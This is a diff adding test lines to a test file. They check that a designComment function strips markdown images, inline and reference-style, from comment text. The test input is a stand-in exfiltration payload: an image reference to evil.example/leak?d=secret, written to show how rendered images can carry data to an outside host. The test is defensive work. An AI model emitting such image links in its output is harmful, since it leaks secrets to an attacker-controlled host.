@@ -139,6 +139,9 @@ test('designComment wraps the answer with the marker and the approval note, and 
   expect(c).not.toContain('@maria')
   expect(c).toContain(`\`${LABEL_GO}\``)
   expect(designComment('x'.repeat(20000))!.length).toBeLessThan(12600)
+  const refImage = designComment('## Understanding\nSee ![alt][r] and ![r] and ![x](https://evil.example/a.png) for context on the request.\n\n[r]: https://evil.example/leak?d=secret\n')!
+  expect(refImage).not.toContain('![')
+  expect(refImage).not.toContain('evil.example/a.png')
 })
 
 test('watchIssues is off by default, parsed when true, and in the approval hash only when on', () => {
